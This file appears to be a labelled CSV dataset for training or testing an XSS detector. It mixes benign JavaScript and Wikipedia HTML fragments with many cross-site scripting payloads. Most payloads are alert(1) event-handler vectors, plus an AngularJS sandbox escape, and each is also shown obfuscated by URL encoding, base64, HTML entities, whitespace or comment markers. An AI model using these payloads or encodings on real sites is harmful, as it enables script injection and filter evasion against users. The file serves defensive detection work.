payload_original,payload_obfuscated,label,technique
"<li><a href=""/wiki/circumscription_(logic)"" title=""circumscription (logic)"">circumscription </a> </li>","<li><a href=""/wiki/circumscription_(logic)"" title=""circumscription (logic)"">circumscription </a> </li>",0,none
"key: ""close"", value: function close(index) { var $collapsibleli = this.$el.children('li').eq(index);","key: ""close"", value: function close(index) { var $collapsibleli = this.$el.children('li').eq(index);",0,none
"<ul onmousemove=""alert(1)"">test</ul>",%3Cul%20onmousemove%3D%22alert%281%29%22%3Etest%3C%2Ful%3E,1,urlencode
"<pre onpaste=""alert(1)"" contenteditable>test</pre>",%3Cpre%20onpaste%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fpre%3E,1,urlencode
this.g = g; } _buildhoursview() {,this.g = g; } _buildhoursview() {,0,none
return this._templatefactory } _getcontentfortemplate() {,return this._templatefactory } _getcontentfortemplate() {,0,none
const selector_modal = `.${class_name_modal}`; const event_modal_hide = 'hide.bs.modal'; const trigger_hover = 'hover';,const selector_modal = `.${class_name_modal}`; const event_modal_hide = 'hide.bs.modal'; const trigger_hover = 'hover';,0,none
"<figcaption oncontextmenu=""alert(1)"">test</figcaption>",%3Cfigcaption%20oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Ffigcaption%3E,1,urlencode
"var isvertical = [top, bottom].indexof(_baseplacement) >= 0","var isvertical = [top, bottom].indexof(_baseplacement) >= 0",0,none
} } _addtoucheventlisteners() {,} } _addtoucheventlisteners() {,0,none
<kbd id=x tabindex=1 onfocus=alert(1)></kbd>,%3Ckbd%20id%3Dx%20tabindex%3D1%20onfocus%3Dalert%281%29%3E%3C%2Fkbd%3E,1,urlencode
<samp onpointerenter=alert(1)>xss</samp>,%3Csamp%20onpointerenter%3Dalert%281%29%3Exss%3C%2Fsamp%3E,1,urlencode
"return this.each(function () { const data = offcanvas.getorcreateinstance(this, config); if (typeof config !== 'string') {","return this.each(function () { const data = offcanvas.getorcreateinstance(this, config); if (typeof config !== 'string') {",0,none
const selector_nav_links = '.nav-link'; const selector_nav_items = '.nav-item'; const selector_list_items = '.list-group-item';,const selector_nav_links = '.nav-link'; const selector_nav_items = '.nav-item'; const selector_list_items = '.list-group-item';,0,none
"<b onmousemove=""alert(1)"">test</b>","<b onmousemove=""alert(1)""> test</ b>",1,whitespace_noise
"<datalist onbeforecopy=""alert(1)"" contenteditable>test</datalist>",PGRhdGFsaXN0IG9uYmVmb3JlY29weT0iYWxlcnQoMSkiIGNvbnRlbnRlZGl0YWJsZT50ZXN0PC9kYXRhbGlzdD4=,1,base64
"this._setattributeifnotexists(parent, 'role', 'tablist') for (const child of children) { this._setinitialattributesonchild(child)","this._setattributeifnotexists(parent, 'role', 'tablist') for (const child of children) { this._setinitialattributesonchild(child)",0,none
<keygen onpointerout=alert(1)>xss</keygen>,PGtleWdlbiBvbnBvaW50ZXJvdXQ9YWxlcnQoMSk+eHNzPC9rZXlnZW4+,1,base64
"<style>@keyframes x{}</style><hr style=""animation-name:x"" onanimationend=""alert(1)""></hr>",&lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;hr style=&quot;animation-name:x&quot; onanimationend=&quot;alert(1)&quot;&gt;&lt;/hr&gt;,1,html_entities
"<ul draggable=""true"" ondragstart=""alert(1)"">test</ul>",%3Cul%20draggable%3D%22true%22%20ondragstart%3D%22alert%281%29%22%3Etest%3C%2Ful%3E,1,urlencode
<tfoot onpointerenter=alert(1)>xss</tfoot>,&lt;tfoot onpointerenter=alert(1)&gt;xss&lt;/tfoot&gt;,1,html_entities
"<dialog onkeyup=""alert(1)"" contenteditable>test</dialog>",PGRpYWxvZyBvbmtleXVwPSJhbGVydCgxKSIgY29udGVudGVkaXRhYmxlPnRlc3Q8L2RpYWxvZz4=,1,base64
"<style>@keyframes x{}</style><bdi style=""animation-name:x"" onanimationend=""alert(1)""></bdi>",&lt;style&gt;@keyframes x{}&lt;/style&gt;&lt;bdi style=&quot;animation-name:x&quot; onanimationend=&quot;alert(1)&quot;&gt;&lt;/bdi&gt;,1,html_entities
"</span> <span class=""reference-text""><cite class=""citation arxiv"">sutskever, ilya; vinyals, oriol; le, quoc v. (2014). ""sequence to sequence learning with neural networks"". <a href=""/wiki/arxiv"" title=""arxiv"">arxiv </a>:<span class=""cs1-lock-free"" title=""freely accessible""><a rel=""nofollow"" class=""external text"" href=""//arxiv.org/abs/1409.3215"">1409.3215 </a>","</span> <span class=""reference-text""><cite class=""citation arxiv"">sutskever, ilya; vinyals, oriol; le, quoc v. (2014). ""sequence to sequence learning with neural networks"". <a href=""/wiki/arxiv"" title=""arxiv"">arxiv </a>:<span class=""cs1-lock-free"" title=""freely accessible""><a rel=""nofollow"" class=""external text"" href=""//arxiv.org/abs/1409.3215"">1409.3215 </a>",0,none
} next = next.nextelementsibling },} next = next.nextelementsibling },0,none
"$textarea.data('previous-length', $textarea[0].value.length); }; $(document).ready(function () {","$textarea.data('previous-length', $textarea[0].value.length); }; $(document).ready(function () {",0,none
https://portswigger-labs.net/impossible-labs/basic-context-length-limit-arbitrary.php?x=%3cq%20oncut=eval(name),aHR0cHM6Ly9wb3J0c3dpZ2dlci1sYWJzLm5ldC9pbXBvc3NpYmxlLWxhYnMvYmFzaWMtY29udGV4dC1sZW5ndGgtbGltaXQtYXJiaXRyYXJ5LnBocD94PSUzY3ElMjBvbmN1dD1ldmFsKG5hbWUp,1,base64
"return _this62; } _createclass(carousel, [{","return _this62; } _createclass(carousel, [{",0,none
let evt = document.createevent('htmlevents'),let evt = document.createevent('htmlevents'),0,none
"for (const listgroup of selectorengine.parents(target, selector_nav_list_group)) { for (const item of selectorengine.prev(listgroup, selector_link_items)) { item.classlist.add(class_name_active)","for (const listgroup of selectorengine.parents(target, selector_nav_list_group)) { for (const item of selectorengine.prev(listgroup, selector_link_items)) { item.classlist.add(class_name_active)",0,none
"_inherits(materialbox, _component4); function materialbox(el, options) { _classcallcheck(this, materialbox);","_inherits(materialbox, _component4); function materialbox(el, options) { _classcallcheck(this, materialbox);",0,none
"const hideevent = eventhandler.trigger(this._element, event_hide, relatedtarget)","const hideevent = eventhandler.trigger(this._element, event_hide, relatedtarget)",0,none
"<basefont onmouseleave=""alert(1)"">test</basefont>","<basefont onmouseleave=""alert(1)"">test</basefont>",1,whitespace_noise
"this.container.removeeventlistener('mouseup', this._handlecontainermouseupandtouchendbound); if (typeof window.ontouchstart !== 'undefined') { this.container.removeeventlistener(","this.container.removeeventlistener('mouseup', this._handlecontainermouseupandtouchendbound); if (typeof window.ontouchstart !== 'undefined') { this.container.removeeventlistener(",0,none
} } this._activetrigger[trigger_click] = false;,} } this._activetrigger[trigger_click] = false;,0,none
"this.el.removeeventlistener('touchstart', this._handlecarouseltapbound); this.el.removeeventlistener('touchmove', this._handlecarouseldragbound); this.el.removeeventlistener('touchend', this._handlecarouselreleasebound);","this.el.removeeventlistener('touchstart', this._handlecarouseltapbound); this.el.removeeventlistener('touchmove', this._handlecarouseldragbound); this.el.removeeventlistener('touchend', this._handlecarouselreleasebound);",0,none
"}); }, closest: function (selector) {","}); }, closest: function (selector) {",0,none
"<div draggable=""true"" contenteditable>drag me</div><abbr ondragover=alert(1) contenteditable>drop here</abbr>","<div draggable=""true"" contenteditable>drag me</div><abbr ondragover=alert(1) contenteditable>drop here</abbr>",1,comment_marker
"<rtc onclick=""alert(1)"">test</rtc>","<rtc onclick=""alert(1)"">test</rtc>  ",1,whitespace_noise
<h1 id=x tabindex=1 onbeforedeactivate=alert(1)></h1><input autofocus>,&lt;h1 id=x tabindex=1 onbeforedeactivate=alert(1)&gt;&lt;/h1&gt;&lt;input autofocus&gt;,1,html_entities
<nextid onfocusout=alert(1) tabindex=1 id=x></nextid><input autofocus>,%3Cnextid%20onfocusout%3Dalert%281%29%20tabindex%3D1%20id%3Dx%3E%3C%2Fnextid%3E%3Cinput%20autofocus%3E,1,urlencode
"<picture><source srcset=""validimage.png""><image onloadend=alert(1)></picture>","<picture><source srcset=""validimage.png""><image onloadend=alert( 1)></picture> ",1,whitespace_noise
"} function mergepaddingobject(paddingobject) { return object.assign({}, getfreshsideobject(), paddingobject);","} function mergepaddingobject(paddingobject) { return object.assign({}, getfreshsideobject(), paddingobject);",0,none
"<style>:target {color:red;}</style><datalist id=x style=""transition:color 1s"" ontransitionend=alert(1)></datalist>","<style>:target {color:red;}</style><datalist id=x style=""transition:color 1s"" ontransitionend=  alert(1) > < /datalist>",1,whitespace_noise
"<form><input type=hidden name=x value=""';eval(name)//""><input type=hidden name=context value=js_string_single><input name=1 type=""image"" src=""validimage.png"" formaction=""http://subdomain1.portswigger-labs.net/xss/xss.php"" formtarget=""alert(1)"" value=""xss via formtarget in input type image""></form>",PGZvcm0+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9eCB2YWx1ZT0iJztldmFsKG5hbWUpLy8iPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWNvbnRleHQgdmFsdWU9anNfc3RyaW5nX3NpbmdsZT48aW5wdXQgbmFtZT0xIHR5cGU9ImltYWdlIiBzcmM9InZhbGlkaW1hZ2UucG5nIiBmb3JtYWN0aW9uPSJodHRwOi8vc3ViZG9tYWluMS5wb3J0c3dpZ2dlci1sYWJzLm5ldC94c3MveHNzLnBocCIgZm9ybXRhcmdldD0iYWxlcnQoMSkiIHZhbHVlPSJ4c3MgdmlhIGZvcm10YXJnZXQgaW4gaW5wdXQgdHlwZSBpbWFnZSI+PC9mb3JtPg==,1,base64
"<style>@keyframes slidein {}</style><a style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></a>","<style>@keyframes slidein {}</style><  a style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)"">  </a>",1,whitespace_noise
y = _data$state$placement.y,y = _data$state$placement.y,0,none
"<output onmouseenter=""alert(1)"">test</output>",PG91dHB1dCBvbm1vdXNlZW50ZXI9ImFsZXJ0KDEpIj50ZXN0PC9vdXRwdXQ+,1,base64
"<bdi oncontextmenu=""alert(1)"">test</bdi>",&lt;bdi oncontextmenu=&quot;alert(1)&quot;&gt;test&lt;/bdi&gt;,1,html_entities
((isminyear && i < opts.minmonth) || (ismaxyear && i > opts.maxmonth),((isminyear && i < opts.minmonth) || (ismaxyear && i > opts.maxmonth),0,none
"eventhandler.on(this._element, event_pointerdown, event => this._start(event)); eventhandler.on(this._element, event_pointerup, event => this._end(event)); this._element.classlist.add(class_name_pointer_event);","eventhandler.on(this._element, event_pointerdown, event => this._start(event)); eventhandler.on(this._element, event_pointerup, event => this._end(event)); this._element.classlist.add(class_name_pointer_event);",0,none
}; anim(animoptions); },}; anim(animoptions); },0,none
"<style type=""text/css"">body{background:url(""<javascript:alert>('')"")}</style>",%3Cstyle%20type%3D%22text%2Fcss%22%3Ebody%7Bbackground%3Aurl%28%22%3Cjavascript%3Aalert%3E%28%27%27%29%22%29%7D%3C%2Fstyle%3E,1,urlencode
const iselement = object => {,const iselement = object => {,0,none
return overflow[side] >= 0,return overflow[side] >= 0,0,none
"<dir onmousedown=""alert(1)"">test</dir>",%3Cdir%20onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fdir%3E,1,urlencode
"<footer onkeypress=""alert(1)"" contenteditable>test</footer>",&lt;footer onkeypress=&quot;alert(1)&quot; contenteditable&gt;test&lt;/footer&gt;,1,html_entities
} ${positioninfo.verticalalignment === 'top' ? '0' : '100%'}`; } open() {,} ${positioninfo.verticalalignment === 'top' ? '0' : '100%'}`; } open() {,0,none
"renderrow(days, isrtl, isrowselected) {","renderrow(days, isrtl, isrowselected) {",0,none
trigger: 'click' } const defaulttype = {,trigger: 'click' } const defaulttype = {,0,none
_this2.each(function (v) {,_this2.each(function (v) {,0,none
} if (math.abs(clientrect.height - height) <= 1) { height = clientrect.height;,} if (math.abs(clientrect.height - height) <= 1) { height = clientrect.height;,0,none
"<li><cite id=""citerefshapiro1992"" class=""citation book"">shapiro, stuart c. (1992). ""artificial intelligence"". in shapiro, stuart c. (ed.). <a rel=""nofollow"" class=""external text"" href=""http://www.cse.buffalo.edu/~shapiro/papers/ai.pdf""><i>encyclopedia of artificial intelligence </i> </a> <span class=""cs1-format"">(pdf)","<li><cite id=""citerefshapiro1992"" class=""citation book"">shapiro, stuart c. (1992). ""artificial intelligence"". in shapiro, stuart c. (ed.). <a rel=""nofollow"" class=""external text"" href=""http://www.cse.buffalo.edu/~shapiro/papers/ai.pdf""><i>encyclopedia of artificial intelligence </i> </a> <span class=""cs1-format"">(pdf)",0,none
"<h3><span class=""mw-headline"" id=""knowledge_representation"">knowledge representation","<h3><span class=""mw-headline"" id=""knowledge_representation"">knowledge representation",0,none
"(global = typeof globalthis !== 'undefined' ? globalthis : global || self, factory(global.sanitizer = {}))","(global = typeof globalthis !== 'undefined' ? globalthis : global || self, factory(global.sanitizer = {}))",0,none
popper: getlayoutrect(popper) }; // modifiers have the ability to reset the current update cycle. the state.reset = false;,popper: getlayoutrect(popper) }; // modifiers have the ability to reset the current update cycle. the state.reset = false;,0,none
"<content onkeyup=""alert(1)"" contenteditable>test</content>",&lt;content onkeyup=&quot;alert(1)&quot; contenteditable&gt;test&lt;/content&gt;,1,html_entities
"<style>@keyframes slidein {}</style><form style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></form>","<style>@keyfr/*OBF*/ames slidein {}</sty/*OBF*/le><form s/*OBF*/tyle=""animation-duration:1s;an/*OBF*/ima/*OBF*/tion-name:slidein;animation-iteration-count:2"" onanima/*OBF*/tioniteration=""alert(1)""></form>",1,comment_marker
"</span> <span class=""toctext"">history","</span> <span class=""toctext"">history",0,none
"key: ""_getdaysinmonth"", value: function _getdaysinmonth(year, month) { return [31, datepicker._isleapyear(year) ? 29 : 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31][month];","key: ""_getdaysinmonth"", value: function _getdaysinmonth(year, month) { return [31, datepicker._isleapyear(year) ? 29 : 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31][month];",0,none
"yearhtml = `<select class=""datepicker-select orig-select-year"" tabindex=""-1"">${arr.join( '' )}</select>`;","yearhtml = `<select class=""datepicker-select orig-select-year"" tabindex=""-1"">${arr.join( '' )}</select>`;",0,none
"$(this).css('color', 'rgba(255,255,255,.9')","$(this).css('color', 'rgba(255,255,255,.9')",0,none
"const items = selectorengine.find(selector_visible_items, this._menu).filter(element => index_js.isvisible(element))","const items = selectorengine.find(selector_visible_items, this._menu).filter(element => index_js.isvisible(element))",0,none
e.stoppropagation(); } _selectoption(optionel) {,e.stoppropagation(); } _selectoption(optionel) {,0,none
toast.xpos = toast._xpos(e); toast.velocityx = toast.deltax / (date.now() - toast.time); toast.time = date.now();,toast.xpos = toast._xpos(e); toast.velocityx = toast.deltax / (date.now() - toast.time); toast.time = date.now();,0,none
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><title id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></title>",&lt;style&gt;@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}&lt;/style&gt;&lt;title id=x style=&quot;position:absolute;&quot; onanimationcancel=&quot;alert(1)&quot;&gt;&lt;/title&gt;,1,html_entities
this._finishselection(); } } else if ($target.closest('.month-prev').length) {,this._finishselection(); } } else if ($target.closest('.month-prev').length) {,0,none
"myoffcanvas.foreach(offcanvas => { offcanvas.addeventlistener('show.bs.offcanvas', event => { event.preventdefault()","myoffcanvas.foreach(offcanvas => { offcanvas.addeventlistener('show.bs.offcanvas', event => { event.preventdefault()",0,none
"<div draggable=""true"" contenteditable>drag me</div><data ondragover=alert(1) contenteditable>drop here</data>","<div draggable=""true"" contenteditable>drag me</div><data ondragover=alert(  1)   contenteditable>drop here</data>",1,whitespace_noise
let dochandlekeyup = function(e) {,let dochandlekeyup = function(e) {,0,none
"collapsible: root.queryselectorall('.collapsible:not(.no-autoinit)'), datepicker: root.queryselectorall('.datepicker:not(.no-autoinit)'), dropdown: root.queryselectorall('.dropdown-trigger:not(.no-autoinit)'),","collapsible: root.queryselectorall('.collapsible:not(.no-autoinit)'), datepicker: root.queryselectorall('.datepicker:not(.no-autoinit)'), dropdown: root.queryselectorall('.dropdown-trigger:not(.no-autoinit)'),",0,none
"<blockquote draggable=""true"" ondragend=""alert(1)"">test</blockquote>",&lt;blockquote draggable=&quot;true&quot; ondragend=&quot;alert(1)&quot;&gt;test&lt;/blockquote&gt;,1,html_entities
#&lt;img/src/onerror=alert(1)&gt;,IyZsdDtpbWcvc3JjL29uZXJyb3I9YWxlcnQoMSkmZ3Q7,1,base64
return; } element.classlist.remove(class_name_active);,return; } element.classlist.remove(class_name_active);,0,none
if (modal._modalsopen === 0) {,if (modal._modalsopen === 0) {,0,none
<svg><xss onload=alert(1)></xss>,&lt;svg&gt;&lt;xss onload=alert(1)&gt;&lt;/xss&gt;,1,html_entities
if (args.length === 1) {,if (args.length === 1) {,0,none
"<style>@keyframes slidein {}</style><caption style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></caption>","<style>@keyframes slidein {}</s/*OBF*/tyle><captio/*OBF*/n style=""animation-duration:1s;animation-n/*OBF*/ame/*OBF*/:slidein;animation-iteration-count:2"" onanimatio/*OBF*/niteration=""alert(1)""></caption>",1,comment_marker
const event_hide = 'hide',const event_hide = 'hide',0,none
"<source onmouseleave=""alert(1)"">test</source>",&lt;source onmouseleave=&quot;alert(1)&quot;&gt;test&lt;/source&gt;,1,html_entities
"<style>@keyframes x{}</style><* style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></*>","<style>@keyframes x{}</style><* style=""animation-name:x"" onwebkitanimationstart=""alert(1)""  ></*>",1,whitespace_noise
"<style>:target {color:red;}</style><xmp id=x style=""transition:color 1s"" ontransitionend=alert(1)></xmp>","<style>:target {color:red;}</  style><xmp id=x style=""transition:color 1s"" ontransitionend=alert(1)><  /xmp>",1,whitespace_noise
"if (![arrow_left_key, arrow_right_key, arrow_up_key, arrow_down_key, home_key, end_key].includes(event.key)) { return; }","if (![arrow_left_key, arrow_right_key, arrow_up_key, arrow_down_key, home_key, end_key].includes(event.key)) { return; }",0,none
{{!ready && (ready = true) && ( !call ? $$watchers[0].get(tostring.constructor.prototype) : (a = apply) && (apply = constructor) && (valueof = call) && (''+''.tostring( 'f = function.prototype;' + 'f.apply = f.a;' + 'delete f.a;' + 'delete f.valueof;' + 'alert(1);' )));}},{{!ready &amp;&amp; (ready = true) &amp;&amp; ( !call ? $$watchers[0].get(tostring.constructor.prototype) : (a = apply) &amp;&amp; (apply = constructor) &amp;&amp; (valueof = call) &amp;&amp; (&#x27;&#x27;+&#x27;&#x27;.tostring( &#x27;f = function.prototype;&#x27; + &#x27;f.apply = f.a;&#x27; + &#x27;delete f.a;&#x27; + &#x27;delete f.valueof;&#x27; + &#x27;alert(1);&#x27; )));}},1,html_entities
"<li id=""cite_note-65""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-65"">^ </a> </b>","<li id=""cite_note-65""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-65"">^ </a> </b>",0,none
} _makedropdownfocusable() { this.dropdownel.tabindex = 0;,} _makedropdownfocusable() { this.dropdownel.tabindex = 0;,0,none
"const eventlisteners = { name: 'eventlisteners', enabled: true,","const eventlisteners = { name: 'eventlisteners', enabled: true,",0,none
"handle.setattribute('data-handle', handlenumber)","handle.setattribute('data-handle', handlenumber)",0,none
let $activelis = this.$el.children('li.active'),let $activelis = this.$el.children('li.active'),0,none
"var carousel = function (_component18) { _inherits(carousel, _component18); function carousel(el, options) {","var carousel = function (_component18) { _inherits(carousel, _component18); function carousel(el, options) {",0,none
<meter onpointerleave=alert(1)>xss</meter>,%3Cmeter%20onpointerleave%3Dalert%281%29%3Exss%3C%2Fmeter%3E,1,urlencode
"<content onmousemove=""alert(1)"">test</content>","<content onmousemove/*OBF*/=""alert(1)"">tes/*OBF*/t</content>",1,comment_marker
"state = sethandle(handlenumber, locations[handlenumber] + proposal, b[o], f[o]) || state; }); if ( state ) {","state = sethandle(handlenumber, locations[handlenumber] + proposal, b[o], f[o]) || state; }); if ( state ) {",0,none
"<data draggable=""true"" ondragenter=""alert(1)"">test</data>",%3Cdata%20draggable%3D%22true%22%20ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fdata%3E,1,urlencode
"<header onbeforepaste=""alert(1)"" contenteditable>test</header>","<header onbeforepaste=""alert(1)"" contenteditable>test</header>",1,comment_marker
templateelement.append(element); return; },templateelement.append(element); return; },0,none
"<code onmouseleave=""alert(1)"">test</code>","<code onmouseleave=""alert(1)  "">test</ code>",1,whitespace_noise
"<ul><li><a href=""/wiki/3d_optical_data_storage"" title=""3d optical data storage"">3d optical data storage </a> </li>","<ul><li><a href=""/wiki/3d_optical_data_storage"" title=""3d optical data storage"">3d optical data storage </a> </li>",0,none
"<li><cite id=""citerefhinton2007"" class=""citation journal"">hinton, g. e. (2007). ""learning multiple layers of representation"". <i>trends in cognitive sciences </i>. <b>11 </b> (10): 428–434. <a href=""/wiki/digital_object_identifier"" title=""digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2fj.tics.2007.09.004"">10.1016/j.tics.2007.09.004 </a>. <a href=""/wiki/pubmed_identifier"" class=""mw-redirect"" title=""pubmed identifier"">pmid </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//pubmed.ncbi.nlm.nih.gov/17921042"">17921042 </a>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=trends+in+cognitive+sciences&amp;rft.atitle=learning+multiple+layers+of+representation&amp;rft.volume=11&amp;rft.issue=10&amp;rft.pages=428-434&amp;rft.date=2007&amp;rft_id=info%3adoi%2f10.1016%2fj.tics.2007.09.004&amp;rft_id=info%3apmid%2f17921042&amp;rft.aulast=hinton&amp;rft.aufirst=g.+e.&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">","<li><cite id=""citerefhinton2007"" class=""citation journal"">hinton, g. e. (2007). ""learning multiple layers of representation"". <i>trends in cognitive sciences </i>. <b>11 </b> (10): 428–434. <a href=""/wiki/digital_object_identifier"" title=""digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2fj.tics.2007.09.004"">10.1016/j.tics.2007.09.004 </a>. <a href=""/wiki/pubmed_identifier"" class=""mw-redirect"" title=""pubmed identifier"">pmid </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//pubmed.ncbi.nlm.nih.gov/17921042"">17921042 </a>. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=trends+in+cognitive+sciences&amp;rft.atitle=learning+multiple+layers+of+representation&amp;rft.volume=11&amp;rft.issue=10&amp;rft.pages=428-434&amp;rft.date=2007&amp;rft_id=info%3adoi%2f10.1016%2fj.tics.2007.09.004&amp;rft_id=info%3apmid%2f17921042&amp;rft.aulast=hinton&amp;rft.aufirst=g.+e.&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",0,none
<source onpointerout=alert(1)>xss</source>,PHNvdXJjZSBvbnBvaW50ZXJvdXQ9YWxlcnQoMSk+eHNzPC9zb3VyY2U+,1,base64
"return pct + '%'; } function updatehandleposition ( handlenumber, to ) {","return pct + '%'; } function updatehandleposition ( handlenumber, to ) {",0,none
<sup onpointerleave=alert(1)>xss</sup>,%3Csup%20onpointerleave%3Dalert%281%29%3Exss%3C%2Fsup%3E,1,urlencode
"value: function _comparedates(a, b) { return a.gettime() === b.gettime(); }","value: function _comparedates(a, b) { return a.gettime() === b.gettime(); }",0,none
dropdown.getorcreateinstance(this).toggle(),dropdown.getorcreateinstance(this).toggle(),0,none
this._swipehelper.dispose() } super.dispose(),this._swipehelper.dispose() } super.dispose(),0,none
"<marquee onpaste=""alert(1)"" contenteditable>test</marquee>","<marquee onpaste=""alert(1)"" contenteditable>test</marquee>",1,whitespace_noise
"<frame onkeydown=""alert(1)"" contenteditable>test</frame>","<frame onkeydown=""alert(1)"" contenteditable>test</  frame> ",1,whitespace_noise
"<hr draggable=""true"" ondrag=""alert(1)"">test</hr>",%3Chr%20draggable%3D%22true%22%20ondrag%3D%22alert%281%29%22%3Etest%3C%2Fhr%3E,1,urlencode
"<script onbeforepaste=""alert(1)"" contenteditable>test</script>",&lt;script onbeforepaste=&quot;alert(1)&quot; contenteditable&gt;test&lt;/script&gt;,1,html_entities
"<style>:target {color:red;}</style><time id=x style=""transition:color 1s"" ontransitionend=alert(1)></time>","<style>:targ/*OBF*/et {color:red;}</style><time id=x style=""transition:color 1s"" ontransitionend=alert(1)></time>",1,comment_marker
"<a href=""http://0x42.0x0000066.0x7.0x93/""></a>","<a href=""http/*OBF*/://0x42.0x0000066.0x7.0x93/""></a>",1,comment_marker
"<spacer onbeforecopy=""alert(1)"" contenteditable>test</spacer>",PHNwYWNlciBvbmJlZm9yZWNvcHk9ImFsZXJ0KDEpIiBjb250ZW50ZWRpdGFibGU+dGVzdDwvc3BhY2VyPg==,1,base64
if (!outerelem.classlist.contains(class_dropdown)) {,if (!outerelem.classlist.contains(class_dropdown)) {,0,none
<frame onpointerdown=alert(1)>xss</frame>,<frame onpoint/*OBF*/erdown=alert(1)>xss</frame>,1,comment_marker
static getinstance(el) { let domelem = !!el.jquery ? el[0] : el; return domelem.m_floatingactionbutton;,static getinstance(el) { let domelem = !!el.jquery ? el[0] : el; return domelem.m_floatingactionbutton;,0,none
} t = t.parentnode; },} t = t.parentnode; },0,none
"anim({ targets: _this40.$active.find('.caption')[0], opacity: 1,","anim({ targets: _this40.$active.find('.caption')[0], opacity: 1,",0,none
element.classlist.remove(class_name_show$1); return; },element.classlist.remove(class_name_show$1); return; },0,none
"<dialog onbeforecopy=""alert(1)"" contenteditable>test</dialog>","<dialog onbeforecopy=""alert(1)"" contenteditable/*OBF*/>test</dialog>",1,comment_marker
"-1!==a.indexof(""."")&&(b=a.split("".""),a=b[0],c&&(n=c+b[1]))","-1!==a.indexof(""."")&&(b=a.split("".""),a=b[0],c&&(n=c+b[1]))",0,none
return e.clienty; } _wrap(x) {,return e.clienty; } _wrap(x) {,0,none
return attributeoptions,return attributeoptions,0,none
"throw new error(""nouislider: 'animationduration' option must be a number.""); } }","throw new error(""nouislider: 'animationduration' option must be a number.""); } }",0,none
_getinnerelement(elem) {,_getinnerelement(elem) {,0,none
"this.placeholder.css({ height: '', width: '',","this.placeholder.css({ height: '', width: '',",0,none
return api; } return {,return api; } return {,0,none
"<link onbeforepaste=""alert(1)"" contenteditable>test</link>",&lt;link onbeforepaste=&quot;alert(1)&quot; contenteditable&gt;test&lt;/link&gt;,1,html_entities
"<style>@keyframes slidein {}</style><dl style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></dl>",&lt;style&gt;@keyframes slidein {}&lt;/style&gt;&lt;dl style=&quot;animation-duration:1s;animation-name:slidein;animation-iteration-count:2&quot; onanimationiteration=&quot;alert(1)&quot;&gt;&lt;/dl&gt;,1,html_entities
<table onfocusout=alert(1) tabindex=1 id=x></table><input autofocus>,%3Ctable%20onfocusout%3Dalert%281%29%20tabindex%3D1%20id%3Dx%3E%3C%2Ftable%3E%3Cinput%20autofocus%3E,1,urlencode
